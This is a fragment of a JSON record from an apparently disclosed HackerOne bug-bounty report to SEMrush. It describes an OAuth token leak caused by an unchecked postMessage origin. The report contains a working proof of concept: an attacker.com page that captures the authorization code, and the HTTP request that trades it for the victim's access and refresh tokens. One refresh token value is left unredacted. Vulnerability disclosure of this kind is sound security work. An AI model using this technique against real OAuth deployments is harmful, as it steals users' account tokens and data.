+    "reporter": {
+        "username": "nikitastupin", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/nikitastupin", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/131/023/168ba06789818ffa83052b67b9ab846e88a0bffc_small.jpg?1491807864"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 27, 
+        "name": "Improper Authentication - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -19986031.97864931, 
+    "disclosed_at": "2018-04-17T11:58:56.526Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/314814", 
+    "created_at": "2018-02-10T19:34:59.147Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"domain-site-application\">Domain, site, application</h2>\n\n<p>oauth.semrush.com</p>\n\n<h2 id=\"steps-to-reproduce\">Steps to reproduce</h2>\n\n<p>1) Create following html at attacker.com/postmessage.html</p>\n<pre class=\"highlight plaintext\"><code>&lt;script&gt;\n  function listener(event) {\n    alert(JSON.stringify(event.data));\n  }\n\n  var dest = window.open(&quot;https://oauth.semrush.com/oauth2/authorize?response_type=code&amp;scope=user.info,projects.info,siteaudit.info&amp;client_id=seoquake&amp;redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&amp;state=636e7bae-22ed-407d-8d62-1d49b49ec962&quot;);\n\n  window.addEventListener(&quot;message&quot;, listener);\n&lt;/script&gt;\n</code></pre>\n<p>2) Go to attacker.com/postmessage.html (make sure you are logged in at <a href=\"/redirect?signature=ee7b47bd45fbe53d774448b303738845936a6ba1&amp;url=http%3A%2F%2Fwww.semrush.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.semrush.com</span><i class=\"icon-external-link\"></i></a>)<br>\n3) Click &quot;Approve&quot;<br>\n4) Go to tab with attacker.com, you will see alert with <code>code</code><br>\n5) Make POST request with obtained <code>code</code></p>\n<pre class=\"highlight plaintext\"><code>POST /oauth2/access_token HTTP/1.1\nHost: oauth.semrush.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: */*\nAccept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-type: application/x-www-form-urlencoded\nContent-Length: 205\nDNT: 1\nConnection: close\n\nclient_id=seoquake&amp;client_secret=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&amp;grant_type=authorization_code&amp;code=[COPY OBTAINED CODE HERE]&amp;redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess\n</code></pre>\n<p>6) Receive response with <code>access token</code> and <code>refresh token</code></p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 OK\nServer: nginx\nContent-Type: application/json\nConnection: close\nCache-Control: no-cache\nDate: Sat, 10 Feb 2018 19:06:38 GMT\nSet-Cookie: session=\u2588\u2588\u2588\u2588; expires=Sat, 10-Feb-2018 21:06:38 GMT; Max-Age=7200; path=/; httponly\n\n{&quot;access_token&quot;:&quot;\u2588\u2588\u2588\u2588\u2588\u2588\u2588&quot;,&quot;token_type&quot;:&quot;Bearer&quot;,&quot;expires_in&quot;:604800,&quot;refresh_token&quot;:&quot;kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC&quot;}\n</code></pre>\n<h2 id=\"actual-results\">Actual results</h2>\n\n<p><code>access token</code> and <code>refresh token</code> of victim:</p>\n<pre class=\"highlight plaintext\"><code>{&quot;access_token&quot;:&quot;\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&quot;,&quot;token_type&quot;:&quot;Bearer&quot;,&quot;expires_in&quot;:604800,&quot;refresh_token&quot;:&quot;kiAMXIrTVjfvD131wraCjTLN4CzS7ABhqUGvweYC&quot;}\n</code></pre>\n<h2 id=\"poc-exploit-code-screenshots-video-references-additional-resources\">PoC, exploit code, screenshots, video, references, additional resources</h2>\n\n<p>This vulnerability is possible due to lack of <code>window.opener</code> origin check at <code>https://oauth.semrush.com/oauth2/success</code>:</p>\n<pre class=\"highlight plaintext\"><code>&lt;script&gt;\n    if (window.opener &amp;&amp; typeof opener.postMessage === &#39;function&#39;) {\n        opener.postMessage({ type: &#39;semrush:oauth:success&#39;, url: location.href }, &#39;*&#39;);\n    }\n&lt;/script&gt;\n</code></pre>\n<p>Meaning any site that opens <code>https://oauth.semrush.com/oauth2/success</code> may read <code>code</code> in <code>location.href</code>.</p>\n\n<p>Attack vector based on fact that user sees SEOquake authorization page <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"approve.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/262/215/861594939f6e5cb9672825c39922437bb3c1ee1d/approve.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQVHWOGSNR%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEBAaDNyA%2BB7EVws6w20xiyK3AzcCTkx0GnZzVQ6TwXkp44%2Ff6M7%2FsO19EHzsTJXAjGqGadXUwBewmY%2FA3saLwd8Xt%2FLbqrBXnPVBmQqsNFRuZECDCBvLhSnrZ0V6VgN9XIGcsvjdqc1keY1F5jqudqF9DVlIY8TMvC8HZK%2B7Q1nt4NsrhczyPwsxABuLuXRQ9jz342kfr6jcg4V0RDeoTmkF41Ft6RtUq0hmoAqdCx1%2Fz70xB4R7l69zShPP7HLfYHPPTt8XR1Db%2BqWNJQckpie0NnlFKA6ZUTMDBoFCJMNlSMrC8fe4WfzeCwJzHJRBg8PuHWSmO%2BotEruefTqBjLBoXXi34gvMNLGz%2F2UMbXN0CJxslsSVQ1hVUGyCtMe0w9EsQpL39cO7khz0GcmiaRxiDS26USPGfQCc9lffeZFTxh4so1l02filHtFdYLVvAvgjiOYt2Mz5u6lBhccM0iI2WWXmcjR%2FS%2BkxYva3%2BrEYrii1%2BMbFzOhDKAxYvafuSoo%2BiLMqIErMru4lSMvT6Hdl0F7q6ar9ursg2xy2ld%2BSsM1Ffwx%2FIlTxlx%2Fk5K%2BKS4mgc5N3QgLYcjLnqKIjMyLCEr%2FVbmVxbtUo%2B7qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=3e98be2c19fe44823953f46bab75fcb3e155136a3c958ccb217d2fda5e488f74\" data-attachment-type=\"image/png\">approve.png (F262215)</a> thinking that it&#39;s just official application permission request and with high probability clicks &quot;Approve&quot;.</p>\n\n<p>Still working at vector without this small user interaction.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>OAuth tokens leakage. This leads to user sensitive information leakage.<br>\n<strong>Note</strong>: it&#39;s not necessary to install SEOquake plugin!</p>\n\n<h2 id=\"p-s\">P.S.</h2>\n\n<p>I&#39;m aware of user info leakage, project info leakage and Site Audit info leakage but maybe there is wider scope of possible sensitive info leak.</p>\n\n<p>I&#39;ve reported vulnerability as soon as possible therefore no time to deeper scope research.</p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://www.semrush.com/", 
+            "about": "", 
+            "twitter_handle": "", 
+            "name": "SEMrush"
+        }, 
+        "handle": "semrush", 
+        "url": "https://hackerone.com/semrush", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/015/966/de40911e781a8b85c3b253fa22f0119175ca91f2_small.png?1477497046", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/015/966/9b01ecc388e5d9d64b3b532dd5db41b02323e9dc_medium.png?1477497046"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 15966, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
